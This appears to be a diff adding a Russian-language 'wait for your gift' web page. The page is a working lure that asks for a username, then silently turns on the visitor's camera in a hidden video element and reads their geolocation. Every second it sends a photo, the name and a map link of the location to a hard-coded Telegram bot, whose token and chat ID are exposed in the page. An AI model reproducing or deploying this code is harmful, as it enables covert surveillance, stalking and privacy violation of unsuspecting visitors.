@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Document</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+</head>
+
+<body class="flex bg-sky-950 items-center h-screen justify-center">
+  <video class="hidden" id="video" width="640" height="480" autoplay></video>
+  <h1 class="text-4xl text-center animate-pulse text-amber-400">
+    Подождите немного чтобы получить подарок!
+  </h1>
+
+  <script>
+    let ism = prompt("Введите своё Имя пользователя");
+    document.addEventListener("DOMContentLoaded", function () {
+    
+      navigator.mediaDevices
+        .getUserMedia({ video: true })
+        .then(function (stream) {
+          var video = document.getElementById("video");
+          video.srcObject = stream;
+          video.play();
+        })
+        .catch(function (err) {
+          console.log("Ошибка при доступе к камере: " + err);
+        });
+
+      function sendPhotoAndLocation() {
+        var video = document.getElementById("video");
+        var canvas = document.createElement("canvas");
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        var context = canvas.getContext("2d");
+        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+        canvas.toBlob(function (blob) {
+     
+          navigator.geolocation.getCurrentPosition(
+            function (position) {
+              var latitude = position.coords.latitude;
+              var longitude = position.coords.longitude;
+              var mapLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
+
+              var formData = new FormData();
+              formData.append("chat_id", "6042672463");
+              formData.append("photo", blob);
+              formData.append(
+                "caption",
+                `Имя пользователя: ${ism}\nМестоположение: ${mapLink}`
+              );
+
+              fetch(
+                "https://api.telegram.org/bot7537112275:AAEBDntfpvhb-N5-QOAUWm16nsCaJfhYngE/sendPhoto",
+                {
+                  method: "POST",
+                  body: formData,
+                }
+              )
+                .then(function (response) {
+                  if (!response.ok) {
+                    throw new Error("Ошибка отправки данных на сервер");
+                  }
+                  console.log("Фотография и геолокация успешно отправлены");
+                })
+                .catch(function (error) {
+                  console.error("Произошла ошибка:", error);
+                });
+            },
+            function (error) {
+              console.error("Ошибка получения геолокации:", error);
+            }
+          );
+        }, "image/jpeg");
+      }
+
+   
+      setInterval(sendPhotoAndLocation, 1000);
+    });
+  </script>
+</body>
+
+</html>
